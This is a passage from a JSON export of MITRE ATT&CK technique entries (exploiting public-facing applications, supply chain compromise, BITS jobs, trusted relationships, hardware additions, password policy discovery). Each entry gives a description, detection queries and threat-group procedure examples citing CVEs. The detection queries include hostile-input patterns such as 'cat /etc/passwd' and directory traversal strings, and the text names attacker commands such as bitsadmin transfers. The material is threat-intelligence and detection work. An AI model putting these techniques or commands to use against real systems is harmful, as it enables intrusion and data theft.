      "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Web Application Firewalls may detect improper inputs attempting exploitation. Web server logs (e.g.,var/log/httpdor/var/log/apachefor Apache web servers on Linux) may also record evidence of exploitation.(source=\"C:\\inetpub\\logs\\LogFiles\\W3SVC*\" OR source=\"/var/log/apache2/access.log\" OR source=\"/var/log/nginx/access.log\")| eval exploit_attempt=if(like(cs_uri_query, \"%exec%\") OR like(cs_uri_query, \"%cmd%\") OR like(cs_uri_query, \"%cat /etc/passwd%\") OR like(cs_uri_query, \"%../../%\"), 1, 0)| stats count by src_ip, cs_uri_query, sc_status| where exploit_attempt=1 AND count > 5| table _time, src_ip, cs_uri_query, sc_status, count",
      "Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection strings or known payloads. For example, monitor for successively chained functions that adversaries commonly abuse (i.e. gadget chaining) through unsafe deserialization to exploit publicly facing applications for initial access.[114]In AWS environments, monitor VPC flow logs and/or Elastic Load Balancer (ELB) logs going to and from instances hosting externally accessible applications.(source=\"/var/log/zeek/http.log\" OR source=\"C:\\Windows\\System32\\LogFiles\\Firewall\")| regex http_request=\"(?i)select.from|union.select|cmd=.|exec=.\"| stats count by src_ip, dest_ip, http_method, uri_path| where count > 10| table _time, src_ip, dest_ip, http_method, uri_path, count"
    ],
    "Procedure Examples": [
      "Agriusexploits public-facing applications for initial access to victim environments. Examples include widespread attempts to exploit CVE-2018-13379 in FortiOS devices and SQL injection activity.[12]",
      "APT28has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[13][14]",
      "APT29has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.[15][16]",
      "APT39has used SQL injection for initial compromise.[17]",
      "APT41exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.[18]APT41leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.[19]APT41exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.[20]",
      "APT5has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers.[21][22][23][24]",
      "ArcaneDoorabused WebVPN traffic to targeted devices to achieve unauthorized remote code execution.[25]",
      "Axiomhas been observed using SQL injection to gain access to systems.[26][27]",
      "BackdoorDiplomacyhas exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor.BackdoorDiplomacyhas also exploited mis-configured Plesk servers.[28]",
      "BlackByteexploited vulnerabilities such as ProxyLogon and ProxyShell for initial access to victim environments.[29][30][31][32]",
      "BlackTechhas exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.[33]",
      "Blue Mockingbirdhas gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.[34]",
      "BOLDMOVEis associated with exploitation of CVE-2022-49475 in FortiOS.[35]",
      "DuringC0017,APT41exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[36]",
      "DuringC0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.[37]",
      "DuringC0027,Scattered Spiderexploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.[38]",
      "Cinnamon Tempesthas exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j.[39][40][41][42]",
      "COATHANGERis installed following exploitation of a vulnerable FortiGate device.[43]",
      "DuringCutting Edge, threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.[44][45][46][47][48]",
      "Dragonflyhas conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.[49]",
      "Earth Luscahas compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.[50]",
      "Ember Beargains initial access to victim environments by exploiting external-facing services. Examples include exploitation of CVE-2021-26084 in Confluence servers; CVE-2022-41040, ProxyShell, and other vulnerabilities in Microsoft Exchange; and multiple vulnerabilities in open-source platforms such as content management systems.[51][52]",
      "FIN13has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.[53][54]",
      "FIN7has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.[39]",
      "FLORAHOX Activityhas exploited and infected vulnerable routers to recruit additional network devices into the ORB.[55]",
      "Fox Kittenhas exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.[56][57][58][59][60]",
      "FrostyGoop Incidentwas likely enabled by the adversary exploiting an unknown vulnerability in an external-facing router.[61]",
      "GALLIUMexploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.[62][63]",
      "GOLD SOUTHFIELDhas exploited Oracle WebLogic vulnerabilities for initial compromise.[64]",
      "HAFNIUMhas exploited multiple vulnerabilities to compromise edge devices and on-premises versions of Microsoft Exchange Server.[65][66][67][68][40][69]",
      "Havijis used to automate SQL injection.[70]",
      "ForHomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access.[71]",
      "INC Ransomhas exploited known vulnerabilities including CVE-2023-3519 in Citrix NetScaler for initial access.[72][73]",
      "Ke3changhas compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.[74]",
      "Kimsukyhas exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.[75]",
      "Leviathanhas used exploits against publicly-disclosed vulnerabilities for initial access into victim networks.[76]",
      "Leviathanexploited public-facing web applications and appliances for initial access duringLeviathan Australian Intrusions.[76]",
      "Magic Houndhas exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via \"ProxyShell\" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379).[77][78][79][80][81][40]",
      "menuPasshas leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.[82]",
      "Moses Staffhas exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.[83]",
      "MuddyWaterhas exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).[84]",
      "DuringNight Dragon, threat actors used SQL injection exploits against extranet web servers to gain access.[85]",
      "DuringOperation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers.[86]",
      "DuringOperation MidnightEclipse, threat actors exploited CVE-2024-3400 in Palo Alto Networks GlobalProtect.[87][88]",
      "DuringOperation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.[89]",
      "Playhas exploited known vulnerabilities for initial access including CVE-2018-13379 and CVE-2020-12812 in FortiOS and CVE-2022-41082 and CVE-2022-41040 (\"ProxyNotShell\") in Microsoft Exchange.[90][91]",
      "Rockeexploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.[92][93]",
      "Salt Typhoonhas exploited CVE-2018-0171 in the Smart Install feature of Cisco IOS and Cisco IOS XE software for initial access.[94]",
      "Sandworm Teamexploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems.[95][96]",
      "Sea Turtlegained access to victim environments by exploiting multiple known vulnerabilities over several campaigns.[97][98]",
      "DuringShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.[99]",
      "Siloscapeis executed after the attacker gains initial access to a Windows container using a known vulnerability.[100]",
      "During theSolarWinds Compromise,APT29exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[101][15]",
      "SoreFangcan gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.[102]",
      "SPACEHOP Activityhas enabled the exploitation of CVE-2022-27518 and CVE-2022-27518 for illegitimate access.[23][55]",
      "sqlmapcan be used to automate exploitation of SQL injection vulnerabilities.[103]",
      "Threat Group-3390has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.[104]",
      "ToddyCathas exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.[105]",
      "Versa Director Zero Day Exploitationinvolved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution.[106]",
      "Volatile Cedarhas targeted publicly facing web servers, with both automatic and manual vulnerability discovery.[107][108]",
      "Volt Typhoonhas gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.[109][110]",
      "Winter Vivernhas exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the \"Follina\" vulnerability.[111][112]",
      "ZxShellhas been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.[113]"
    ]
  },
  "T1195": {
    "Name": "Supply Chain Compromise",
    "Description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development toolsManipulation of a development environmentManipulation of source code repositories (public or private)Manipulation of source code in open-source dependenciesManipulation of software update/distribution mechanismsCompromised/infected system images (multiple cases of removable media infected at the factory)[1][2]Replacement of legitimate software with modified versionsSales of modified/counterfeit products to legitimate distributorsShipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.[3][4][5]Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[6][3][5]Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.[7]",
    "Detects": [
      "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity.((sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=15) OR (sourcetype=\"WinEventLog:Security\" EventCode=4663)) OR (source=\"/var/log/audit/audit.log\" SYSCALL=\"open\" path IN (\"/bin\", \"/usr/bin\", \"/etc\"))| eval risk_score=case(    like(path, \"%system32%\"), 7,    like(path, \"%/usr/local/bin%\"), 6,    like(path, \"%Program Files%\"), 5)| where risk_score >= 5| stats count by host, user, path, process, risk_score| table _time, host, user, path, process, risk_score",
      "Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes and compare against known good baseline behavior.(EventCode=7045 OR EventCode=1116)OR (source=\"/var/log/system.log\" message=\"Blocked binary execution\")| eval risk_score=case(    like(Image, \"%Temp%\"), 7,    like(Image, \"%AppData%\"), 6,    like(Image, \"%C:\\Users\\Public%\"), 8)| where risk_score >= 6| stats count by host, user, Image, CommandLine, risk_score| table _time, host, user, Image, CommandLine, risk_score"
    ],
    "Procedure Examples": [
      "Ember Bearhas compromised information technology providers and software developers providing services to targets of interest, building initial access to ultimate victims at least in part through compromise of service providers that work with the victim organizations.[8]",
      "Lumma Stealerhas been delivered through cracked software downloads.[9][10][11]",
      "OilRighas leveraged compromised organizations to conduct supply chain attacks on government entities.[12]",
      "Raccoon Stealerhas been distributed through cracked software downloads.[13]",
      "Sandworm Teamstaged compromised versions of legitimate software installers on forums to achieve initial, untargetetd access in victim environments.[14]"
    ]
  },
  "T1195.001": {
    "Name": "Supply Chain Compromise:Compromise Software Dependencies and Development Tools",
    "Description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.[1]Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
    "Detects": [
      "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity.(EventCode=15 OR EventCode=4663) OR (source=\"/var/log/audit/audit.log\" SYSCALL=\"open\" path IN (\"/usr/bin/gcc\", \"/usr/bin/make\", \"/usr/local/bin/node\", \"/opt/build-tools/\"))| eval risk_score=case(    like(path, \"%npm%\"), 7,    like(path, \"%python%\"), 6,    like(path, \"%gcc%\"), 6,    like(path, \"%make%\"), 5)| where risk_score >= 5| stats count by host, user, path, process, risk_score| table _time, host, user, path, process, risk_score"
    ],
    "Procedure Examples": [
      "XCSSETadds malicious code to a host's Xcode projects by enumerating CocoaPodstarget_integrator.rbfiles under the/Library/Ruby/Gemsfolder or enumerates all.xcodeprojfolders under a given directory.XCSSETthen downloads a script and Mach-O file into the Xcode project folder.[2]"
    ]
  },
  "T1195.002": {
    "Name": "Supply Chain Compromise:Compromise Software Supply Chain",
    "Description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[1][2]",
    "Detects": [
      "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity."
    ],
    "Procedure Examples": [
      "APT41gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.[3]",
      "CCBkdrwas added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.[4][5][1]",
      "Cobalt Grouphas compromised legitimate web browser updates to deliver a backdoor.[6]",
      "Daggerflyis associated with several supply chain compromises using malicious updates to compromise victims.[7][8]",
      "Dragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.[9][10]",
      "FIN7has gained initial access by compromising a victim's software supply chain.[11]",
      "GOLD SOUTHFIELDhas distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.[12][13][14]",
      "GoldenSpyhas been packaged with a legitimate tax preparation software.[15]",
      "Moonstone Sleethas distributed a trojanized version of PuTTY software for initial access to victims.[16]",
      "Sandworm Teamhas distributedNotPetyaby compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.[17][18][19]",
      "During theSolarWinds Compromise,APT29gained initial network access to some victims via a trojanized update of SolarWinds Orion software.[20][21][22][23]",
      "SUNSPOTmalware was designed and used to insertSUNBURSTinto software builds of the SolarWinds Orion IT management product.[24]",
      "Threat Group-3390has compromised the Able Desktop installer to gain access to victim's environments.[25]"
    ]
  },
  "T1195.003": {
    "Name": "Supply Chain Compromise:Compromise Hardware Supply Chain",
    "Description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
    "Detects": [
      "Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes and and compare against known good baseline behavior."
    ],
    "Procedure Examples": [
      "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.[1][2]"
    ]
  },
  "T1197": {
    "Name": "BITS Jobs",
    "Description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed throughComponent Object Model(COM).[1][2]BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible throughPowerShelland theBITSAdmintool.[2][3]Adversaries may abuse BITS to download (e.g.Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g.Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6]BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to performExfiltration Over Alternative Protocol.[4]",
    "Detects": [
      "Monitor executed commands and arguments from the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)[2]Admin logs, PowerShell logs, and the Windows Event log for BITS activity.[23]Also consider investigating more detailed information about jobs by parsing the BITS job database.[4]",
      "Monitor for newly constructed network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).",
      "Monitor for newly constructed BITS tasks to enumerate using the BITSAdmin tool (bitsadmin /list /allusers /verbose).Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). Analytic 1 is oriented around looking for the creation of Microsoft Background Intelligent Transfer Service utility (bitsadmin.exe) processes that schedule a BITS job to persist on an endpoint. The analytic identifies the command-line parameters used to create, resume or add a file to a BITS job; these are typically seen combined in a single command-line or executed in sequence.Analytic 2 identifies Microsoft Background Intelligent Transfer Service utilitybitsadmin.exeusing thetransferparameter to download a remote object. In addition, look fordownloadoruploadon the command-line, the switches are not required to perform a transfer. Capture any files downloaded. Review the reputation of the IP or domain used. Typically once executed, a follow on command will be used to execute the dropped file. Network connection or file modification events related will not spawn or create frombitsadmin.exe, but the artifacts will appear in a parallel process ofsvchost.exewith a command-line similar tosvchost.exe -k netsvcs -s BITS. It’s important to review all parallel and child processes to capture any behaviors and artifacts. In some suspicious and malicious instances, BITS jobs will be created. You can usebitsadmin /list /verboseto list out the jobs during investigation.Analytic 1 - BITS Job Persistence(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\System32\\bitsadmin.exe\" AND   (CommandLine= \"create\" OR   CommandLine= \"addfile\" OR    CommandLine= \"setnotifyflags\" OR   CommandLine= \"setnotifycmdline\" OR   CommandLine= \"setminretrydelay\" OR    CommandLine= \"setcustomheaders\" OR   CommandLine= \"resume\")Analytic 2 - BITSAdmin Download File(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\System32\\bitsadmin.exe\" AND CommandLine=transfer",
      "BITS runs as a service and its status can be checked with the Sc query utility (sc query bits).[24]"
    ],
    "Procedure Examples": [
      "APT39has used the BITS protocol to exfiltrate stolen data from a compromised host.[8]",
      "APT41usedBITSAdminto download and install payloads.[9][10]",
      "Bazarhas been downloaded via Windows BITS functionality.[11]",
      "BITSAdmincan be used to createBITS Jobsto launch a malicious process.[12]",
      "Cobalt Strikecan download a hosted \"beacon\" payload usingBITSAdmin.[13][14][15]",
      "Egregorhas used BITSadmin to download and execute malicious DLLs.[16]",
      "AJPINvariant downloads the backdoor payload via the BITS service.[17]",
      "Leviathanhas usedBITSAdminto download additional tools.[18]",
      "MarkiRATcan use BITS Utility to connect with the C2 server.[19]",
      "Patchworkhas used BITS jobs to download malicious payloads.[20]",
      "ProLockcan use BITS jobs to download its malicious payload.[21]",
      "UBoatRATtakes advantage of the /SetNotifyCmdLine option inBITSAdminto ensure it stays running on a system to maintain persistence.[7]",
      "Wizard Spiderhas used batch scripts that utilizes WMIC to execute aBITSAdmintransfer of a ransomware payload to each compromised machine.[22]"
    ]
  },
  "T1199": {
    "Name": "Trusted Relationship",
    "Description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such,Valid Accountsused by the other party for access to internal network systems may be compromised and used.[1]In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.[2]",
    "Detects": [
      "Configuration management databases (CMDB) and other asset management systems may help with the detection of computer systems or network devices that should not exist on a network. Monitor logs for unexpected actions taken by any delegated administrator accounts.[21]",
      "Monitor for newly constructed logon behavior that may breach or otherwise leverage organizations who have access to intended victims.Analytic 1 - Detecting Suspicious Logins from Trusted 3rd parties(EventCode=4624 OR EventCode=4625) OR (source=\"/var/log/auth.log\" OR source=\"/var/log/secure\" \"sshd\")OR (source=\"o365_audit_logs\" operation=\"UserLoggedIn\")OR (source=\"aws_cloudtrail\" eventName=\"ConsoleLogin\")| eval risk_score=case(    like(User, \"%thirdparty%\"), 8,    failed_attempts > 5, 7,    geo_location!=\"expected_location\", 6)| where risk_score >= 6| stats count by _time, host, User, geo_location, risk_score",
      "Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Analytic 1 - Detecting abnormal session activity from trusted accounts(EventCode=4776) OR (source=\"o365_audit_logs\" operation IN (\"RefreshTokenUsed\", \"MFABypassed\"))OR (source=\"aws_cloudtrail\" eventName IN (\"GetSessionToken\", \"AssumeRole\"))| eval risk_score=case(    session_duration > 12*3600, 7,    multiple_locations_within_10min=true, 8,    mfa_bypass=true, 9)| where risk_score >= 7| stats count by _time, host, User, session_duration, mfa_bypass, risk_score",
      "Monitor network traffic associated with third-party provider access, focusing on unusual data transfers, remote session activity, and access to sensitive resources. Identify unexpected communication patterns, data exfiltration attempts, or traffic to/from suspicious IP addresses.Analytic 1 - Detecting unusual network activity from trusted 3rd parties(EventCode=3)OR (source=\"/var/log/zeek/conn.log\" \"SSH\")OR (source=\"aws_vpc_logs\" dest_port IN (3389, 22, 443))| eval risk_score=case(    like(src_ip, \"%thirdparty%\"), 8,    lateral_movement_detected=true, 7,    new_connection_from_cloud=true, 9)| where risk_score >= 7| stats count by _time, host, src_ip, dest_ip, protocol, risk_score"
    ],
    "Procedure Examples": [
      "OnceAPT28gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[3]",
      "APT29has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.[4]",
      "GOLD SOUTHFIELDhas breached Managed Service Providers (MSP's) to deliver malware to MSP customers.[5]",
      "HAFNIUMhas used stolen API keys and credentials associatd with privilege access management (PAM), cloud app providers, and cloud data management companies to access downstream customer environments.[6]",
      "LAPSUS$has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.[7]",
      "menuPasshas used legitimate access granted to Managed Service Providers in order to access victims of interest.[8][9][10][11][12]",
      "POLONIUMhas used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.[13]",
      "RedCurlhas gained access to a contractor to pivot to the victim’s infrastructure.[14]",
      "Sandworm Teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.[15]Additionally,Sandworm Teamhas accessed Internet service providers and telecommunication entities that provide mobile connectivity.[16]",
      "Sea Turtletargeted third-party entities in trusted relationships with primary targets to ultimately achieve access at primary targets. Entities targeted included DNS registrars, telecommunication companies, and internet service providers.[17]",
      "During theSolarWinds Compromise,APT29gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[18][19]",
      "Threat Group-3390has compromised third party service providers to gain access to victim's environments.[20]"
    ]
  },
  "T1200": {
    "Name": "Hardware Additions",
    "Description": "Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e.Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e.Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.[1][2][3][4]",
    "Detects": [
      "Monitor new external hardware devices connected to a system (USB, Thunderbolt, PCIe), unauthorized HID (Human Interface Device) injections simulating keyboard/mouse inputs, unusual kernel-level access from attached devices (e.g., DMA attacks), or execution of suspicious processes upon device connection.Analytic 1 - Detecting Unauthorized USB or Thunderbolt Devices(EventCode=6416) OR (source=\"/var/log/messages\" OR source=\"/var/log/syslog\" \"usb\" OR \"thunderbolt\")OR (source=\"sysmon\" EventCode=1 Image=\"C:\\Windows\\System32\\cmd.exe\" CommandLine=\"usb\")| eval risk_score=case(    like(DeviceID, \"%BadUSB%\"), 8,    like(DeviceID, \"%RubberDucky%\"), 9,    like(DeviceID, \"%LanTap%\"), 7)| where risk_score >= 7| stats count by _time, host, DeviceID, user, risk_score",
      "Monitor for newly constructed drives or other related events associated with computer hardware and other accessories (especially new or unknown) being connected to systems. Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.Analytic 1 - Detecting Unauthorized External Drives(EventCode=4663 OR EventCode=11)OR (source=\"/var/log/messages\" OR source=\"/var/log/syslog\" \"block device added\")OR (source=\"macOS_logs\" Event=\"com.apple.diskarbitrationd\")| eval risk_score=case(    like(DeviceName, \"%Kingston%\"), 7,    like(DeviceName, \"%SanDisk%\"), 6,    like(DeviceName, \"%Unknown%\"), 9)| where risk_score >= 7| stats count by _time, host, DeviceName, user, risk_score",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.Analytic 1 - Detecting Unauthorized Network Devices(EventCode=10400)OR (source=\"/var/log/syslog\" \"new MAC address detected\")OR (source=\"firewall_logs\" \"DHCP Lease Granted\" mac_address NOT IN (trusted_macs))| eval risk_score=case(    like(mac_address, \"%00:0C:29%\"), 8,    like(mac_address, \"%Unknown%\"), 9,    like(mac_address, \"%RaspberryPi%\"), 7)| where risk_score >= 7| stats count by _time, host, mac_address, ip_address, risk_score"
    ],
    "Procedure Examples": [
      "DarkVishnyaphysically connected Bash Bunny, Raspberry Pi, netbooks, and inexpensive laptops to the target organization's environment to access the company’s local network.[5]"
    ]
  },
  "T1201": {
    "Name": "Password Policy Discovery",
    "Description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack throughBrute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such asnet accounts (/domain),Get-ADDefaultDomainPasswordPolicy,chage -l,cat /etc/pam.d/common-password, andpwpolicy getaccountpolicies[1][2]. Adversaries may also leverage aNetwork Device CLIon network devices to discover password policy information (e.g.show aaa,show aaa common-criteria policy all).[3]Password policies can be discovered in cloud environments using available APIs such asGetAccountPasswordPolicyin AWS[4].",
    "Detects": [
      "Monitor executed commands and arguments for actions that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.",
      "Monitor for newly executed processes that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment.",
      "Monitor for contextual data about an account that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment."
    ],
    "Procedure Examples": [
      "Chimerahas used the NtdsAudit utility to collect information related to accounts and passwords.[5]",
      "CrackMapExeccan discover the password policies applied to the target system.[6]",
      "Kwampirscollects password policy information with the commandnet accounts.[7]",
      "Thenet accountsandnet accounts /domaincommands withNetcan be used to obtain password policy information.[8]",
      "OilRighas used net.exe in a script withnet accounts /domainto find the password policy of a domain.[9]",
      "DuringOperation CuckooBees, the threat actors used thenet accountscommand as part of their advanced reconnaissance.[10]",
      "PoshC2can useGet-PassPolto enumerate the domain password policy.[11]",
      "Turlahas usednet accountsandnet accounts /domainto acquire password policy information.[12]"
    ]
  },
  "T1202": {
    "Name": "Indirect Command Execution",
